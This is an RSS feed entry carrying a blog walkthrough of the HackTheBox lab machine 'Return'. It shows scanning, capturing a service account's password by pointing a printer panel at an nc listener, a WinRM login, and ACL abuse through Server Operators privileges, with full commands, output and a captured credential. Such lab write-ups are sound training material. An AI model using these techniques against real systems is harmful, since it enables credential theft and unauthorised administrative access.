<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Windows on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/windows/</link>
    <description>Recent content in Windows on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sun, 24 Oct 2021 09:12:47 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/windows/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Return</title>
      <link>https://fahmifj.github.io/hackthebox/return/</link>
      <pubDate>Sun, 24 Oct 2021 09:12:47 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/return/</guid>
      <description>Return is another machine listed in the HTB printer exploitation track. This machine hosts a web panel for managing a network printer, and this panel stores a user credentials with a masked password. By changing the printer&amp;rsquo;s address to my IP, I can obtain the unmasked password. Enumerating the user&amp;rsquo;s info reveals that it&amp;rsquo;s member of two privileged groups which can then be abused to gain administrative access in multiple ways.</description>
      <content:encoded><![CDATA[<p>Return is another machine listed in the HTB printer exploitation track. This machine hosts a web panel for managing a network printer, and this panel stores a user credentials with a masked password. By changing the printer&rsquo;s address to my IP, I can obtain the unmasked password. Enumerating the user&rsquo;s info reveals that it&rsquo;s member of two privileged groups which can then be abused to gain administrative access in multiple ways.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Abusing network printer</li>
<li>Abusing Windows Server Operators group</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Netcat</li>
<li><a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1">ACL-FullControl.ps1</a></li>
<li><a href="https://github.com/fahmifj/AAD-scripts/blob/main/Acl-RevokeFullControl.ps1">ACL-RevokeFullControl.ps1</a></li>
<li><a href="https://github.com/calebstewart/CVE-2021-1675">PrintNightmare LPE</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full TCP scan discovers a bunch of ports open. Seeing port 53, 88, and 389, I can safely assume this is Active Directory system.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.13» 
</span></span><span class="line"><span class="cl">$ fscan 10.10.11.108 <span class="k">return</span>
</span></span><span class="line"><span class="cl">nmap -p- 10.10.11.108 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
</span></span><span class="line"><span class="cl">nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49673,49676,49688,59797 -sC -sV -oA nmap/all-tcp-ports-return 10.10.11.108
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-15 18:48 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.108
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.066s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
</span></span><span class="line"><span class="cl">80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: HTB Printer Admin Panel
</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2021-10-15 23:14:10Z<span class="o">)</span>
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: <span class="k">return</span>.local0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">636/tcp   open  tcpwrapped
</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: <span class="k">return</span>.local0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped
</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span class="line"><span class="cl">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49665/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49666/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49669/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">49671/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49673/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49676/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49688/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">59797/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">Service Info: Host: PRINTER<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 25m20s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-10-15T23:15:10
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 72.44 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>On SMB, anonymous login is allowed, but there is no share available.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.11.108/
</span></span><span class="line"><span class="cl">Anonymous login successful
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
</span></span><span class="line"><span class="cl">        ---------       ----      -------
</span></span><span class="line"><span class="cl">SMB1 disabled -- no workgroup available
</span></span></code></pre></div><p>I tried to enumerate the domain users, but got access denied.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ rpcclient -U <span class="s1">&#39;%&#39;</span> 10.10.11.108                                                     
</span></span><span class="line"><span class="cl">rpcclient $&gt; srvinfo
</span></span><span class="line"><span class="cl">Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
</span></span><span class="line"><span class="cl">rpcclient $&gt; enumdomusers 
</span></span><span class="line"><span class="cl">result was NT_STATUS_ACCESS_DENIED
</span></span></code></pre></div><h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
<p>Without creds, there is no hope here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -x -h 10.10.11.108 -b <span class="s2">&#34;dc=return,dc=local&#34;</span>
</span></span><span class="line"><span class="cl">Operations error <span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">Additional information: 000004DC: LdapErr: DSID-0C090A37, comment: In order to perform this operation a successful <span class="nb">bind</span> must be completed on the connection., data 0, v4563
</span></span></code></pre></div><h3 id="tcp-80---printer-panel">TCP 80 - Printer Panel</h3>
<p>A printer admin panel for managing printer is shown on port 80.</p>
<p><div class="img-container"><img src="imgs/image-20211017015705468.png" alt="image-20211017015705468"  /></div>
</p>
<p>Under the settings menu, I can see the printer&rsquo;s configuration, which reveals a username and a masked password. This password can&rsquo;t be unmasked by modifying the HTML attribute.</p>
<p><div class="img-container"><img src="imgs/image-20211017015826808.png" alt="image-20211017015826808"  /></div>
</p>
<p>Clicking on the update button sends out a POST request with parameter <code>ip</code> to Return&rsquo;s IP.</p>
<p><div class="img-container"><img src="imgs/image-20211017023404252.png" alt="image-20211017023404252"  /></div>
</p>
<p>The key takeaway from this is that I was the one who triggered that request.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-svc-printer">Shell as svc-printer</h3>
<h4 id="capturing-password">Capturing Password</h4>
<p>From the previous enumeration on printer panel, what if I change the server address to my IP and setup a nc listener?.</p>
<p><div class="img-container"><img src="imgs/image-20211017022203702.png" alt="image-20211017022203702"  /></div>
</p>
<p>The answer is the password pops up on my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">389</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">389</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.11<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.108<span class="o">]</span> <span class="m">50904</span>
</span></span><span class="line"><span class="cl">0*<span class="sb">`</span>%return<span class="se">\s</span>vc-printer�
</span></span><span class="line"><span class="cl">                       1edFg43012!!
</span></span></code></pre></div><p>CrackMapExec shows that <code>return\svc-printer:1edFg43012!!</code> is a valid credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ crackmapexec smb 10.10.11.108 -u <span class="s1">&#39;svc-printer&#39;</span> -p <span class="s1">&#39;1edFg43012!!&#39;</span>
</span></span><span class="line"><span class="cl">SMB         10.10.11.108    <span class="m">445</span>    PRINTER          <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:PRINTER<span class="o">)</span> <span class="o">(</span>domain:return.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         10.10.11.108    <span class="m">445</span>    PRINTER          <span class="o">[</span>+<span class="o">]</span> <span class="k">return</span>.local<span class="se">\s</span>vc-printer:1edFg43012!! 
</span></span><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ crackmapexec winrm 10.10.11.108 -u <span class="s1">&#39;svc-printer&#39;</span> -p <span class="s1">&#39;1edFg43012!!&#39;</span> 	
</span></span><span class="line"><span class="cl">WINRM       10.10.11.108    <span class="m">5985</span>   PRINTER          <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> <span class="o">(</span>name:PRINTER<span class="o">)</span> <span class="o">(</span>domain:return.local<span class="o">)</span>
</span></span><span class="line"><span class="cl">WINRM       10.10.11.108    <span class="m">5985</span>   PRINTER          <span class="o">[</span>*<span class="o">]</span> http://10.10.11.108:5985/wsman
</span></span><span class="line"><span class="cl">WINRM       10.10.11.108    <span class="m">5985</span>   PRINTER          <span class="o">[</span>+<span class="o">]</span> <span class="k">return</span>.local<span class="se">\s</span>vc-printer:1edFg43012!! <span class="o">(</span>Pwn3d!<span class="o">)</span>
</span></span></code></pre></div><h4 id="winrm---svc-printer">WinRM - svc-printer</h4>
<p>I can login via WinRM and grab the flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.11.108 -u <span class="s1">&#39;svc-printer&#39;</span> -p<span class="s1">&#39;1edFg43012!!&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; 
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; gci
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                -------------         ------ ----
</span></span><span class="line"><span class="cl">-ar---       10/14/2021  10:33 PM             <span class="m">34</span> user.txt
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; gc user.txt 
</span></span><span class="line"><span class="cl">48ba9...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="administrative-access">Administrative Access</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Checking user&rsquo;s privileges with <code>whoami</code> reveals that <code>svc-printer</code> is a member of Server Operators and Print Operators. There are also some access tokens that can be abused.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; whoami /all
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">USER INFORMATION
</span></span><span class="line"><span class="cl">----------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User Name          <span class="nv">SID</span>
</span></span><span class="line"><span class="cl"><span class="o">==================</span> <span class="o">=============================================</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span><span class="se">\s</span>vc-printer S-1-5-21-3750359090-2939318659-876128439-1103
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">GROUP INFORMATION
</span></span><span class="line"><span class="cl">-----------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Group Name                                 Type             SID          <span class="nv">Attributes</span>
</span></span><span class="line"><span class="cl"><span class="o">==========================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">==================================================</span>
</span></span><span class="line"><span class="cl">Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\S</span>erver Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\P</span>rint Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\R</span>emote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\U</span>sers                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\P</span>re-Windows <span class="m">2000</span> Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\N</span>ETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\A</span>uthenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\T</span>his Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\N</span>TLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">Mandatory Label<span class="se">\H</span>igh Mandatory Level       Label            S-1-16-12288
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
</span></span><span class="line"><span class="cl">----------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Privilege Name                Description                         <span class="nv">State</span>
</span></span><span class="line"><span class="cl"><span class="o">=============================</span> <span class="o">===================================</span> <span class="o">=======</span>
</span></span><span class="line"><span class="cl">SeMachineAccountPrivilege     Add workstations to domain          Enabled
</span></span><span class="line"><span class="cl">SeLoadDriverPrivilege         Load and unload device drivers      Enabled
</span></span><span class="line"><span class="cl">SeSystemtimePrivilege         Change the system <span class="nb">time</span>              Enabled
</span></span><span class="line"><span class="cl">SeBackupPrivilege             Back up files and directories       Enabled
</span></span><span class="line"><span class="cl">SeRestorePrivilege            Restore files and directories       Enabled
</span></span><span class="line"><span class="cl">SeShutdownPrivilege           Shut down the system                Enabled
</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
</span></span><span class="line"><span class="cl">SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set</span>      Enabled
</span></span><span class="line"><span class="cl">SeTimeZonePrivilege           Change the <span class="nb">time</span> zone                Enabled
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">USER CLAIMS INFORMATION
</span></span><span class="line"><span class="cl">-----------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User claims unknown.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Kerberos support <span class="k">for</span> Dynamic Access Control on this device has been disabled.
</span></span></code></pre></div><p>According to this <a href="https://ss64.com/nt/syntax-security_groups.html">site</a>, <strong>Server Operators</strong> is:</p>
<blockquote>
<p>A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer.</p>
</blockquote>
<p>I can say that <strong>Server Operators</strong> is the ultimate version of <strong>Backup Operators</strong>.</p>
<p>As for Print Operators, I&rsquo;ll remember from HTB: Fuse that it can be exploited by loading a malicious driver using <code>SeLoadDriverPrivilege</code>. I don&rsquo;t demo it here, so see <a href="https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#priv-svc-print--system">this awesome post</a> by 0xdf instead.</p>
<p>Further enumeration reveals that Print Spooler is running ( ͡° ͜ʖ ͡°).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; Get-Service -Name Spooler
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Status   Name               DisplayName
</span></span><span class="line"><span class="cl">------   ----               -----------
</span></span><span class="line"><span class="cl">Running  Spooler            Print Spooler
</span></span></code></pre></div><h4 id="diskshadow-failed">DiskShadow (failed)</h4>
<p>The back up and restore files involve two access tokens: <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>. These tokens were previously abused to dump AD database (NTDS.d) in <a href="https://fahmifj.github.io/hackthebox/blackfield/#shell-as-administrator">HTB: Blackfield</a>.</p>
<p>I tried to reproduce the attack here, but I got the following results.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; diskshadow /s script.txt
</span></span><span class="line"><span class="cl">Microsoft DiskShadow version 1.0
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2013</span> Microsoft Corporation
</span></span><span class="line"><span class="cl">On computer:  PRINTER,  10/16/2021 1:24:40 PM
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-&gt; <span class="nb">set</span> context persistent nowriters
</span></span><span class="line"><span class="cl">-&gt; add volume c: <span class="nb">alias</span> iamf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">COM call <span class="s2">&#34;(*vssObject)-&gt;InitializeForBackup&#34;</span> failed.
</span></span></code></pre></div><p>The intended way, according to the official writeup, is to abuse the <code>Server Operators</code> ability to start/stop/modify services, but I&rsquo;ll put that aside.</p>
<h4 id="acl-full-access">ACL Full Access</h4>
<p>There is another way that still involves the <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>. It&rsquo;s to modify ACL and grant myself full access to the file/folder I specified using <a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1">this PowerShell script</a>. In the following, I use that script to own the entire admin&rsquo;s desktop folder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt;Acl-FullControl -user <span class="k">return</span><span class="se">\s</span>vc-printer -path c:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Current permissions:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl">Owner  : BUILTIN<span class="se">\A</span>dministrators
</span></span><span class="line"><span class="cl">Group  : RETURN<span class="se">\D</span>omain Users
</span></span><span class="line"><span class="cl">Access : NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
</span></span><span class="line"><span class="cl">         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
</span></span><span class="line"><span class="cl">         RETURN<span class="se">\A</span>dministrator Allow  FullControl
</span></span><span class="line"><span class="cl">Audit  :
</span></span><span class="line"><span class="cl">Sddl   : O:BAG:DUD:<span class="o">(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Changing permissions to c:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Acls changed successfully.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl">Owner  : BUILTIN<span class="se">\A</span>dministrators
</span></span><span class="line"><span class="cl">Group  : RETURN<span class="se">\D</span>omain Users
</span></span><span class="line"><span class="cl">Access : RETURN<span class="se">\s</span>vc-printer Allow  FullControl
</span></span><span class="line"><span class="cl">         NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
</span></span><span class="line"><span class="cl">         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
</span></span><span class="line"><span class="cl">         RETURN<span class="se">\A</span>dministrator Allow  FullControl
</span></span><span class="line"><span class="cl">Audit  :
</span></span><span class="line"><span class="cl">Sddl   : O:BAG:DUD:AI<span class="o">(</span>A<span class="p">;</span>OICI<span class="p">;</span>FA<span class="p">;;;</span>S-1-5-21-3750359090-2939318659-876128439-1103<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
</span></span></code></pre></div><p>Now I can read the flag</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nb">type</span> <span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
</span></span><span class="line"><span class="cl">9f8dd...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>I also made the <a href="https://github.com/fahmifj/AAD-scripts/blob/main/Acl-RevokeFullControl.ps1">anti script</a> to revert what I did on the admin&rsquo;s desktop folder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Acl-RevokeFullControl -User <span class="k">return</span><span class="se">\s</span>vc-printer -Path C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Current permissions:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl">Owner  : BUILTIN<span class="se">\A</span>dministrators
</span></span><span class="line"><span class="cl">Group  : RETURN<span class="se">\D</span>omain Users
</span></span><span class="line"><span class="cl">Access : RETURN<span class="se">\s</span>vc-printer Allow  FullControl
</span></span><span class="line"><span class="cl">         NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
</span></span><span class="line"><span class="cl">         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
</span></span><span class="line"><span class="cl">         RETURN<span class="se">\A</span>dministrator Allow  FullControl
</span></span><span class="line"><span class="cl">Audit  :
</span></span><span class="line"><span class="cl">Sddl   : O:BAG:DUD:AI<span class="o">(</span>A<span class="p">;</span>OICI<span class="p">;</span>FA<span class="p">;;;</span>S-1-5-21-3750359090-2939318659-876128439-1103<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
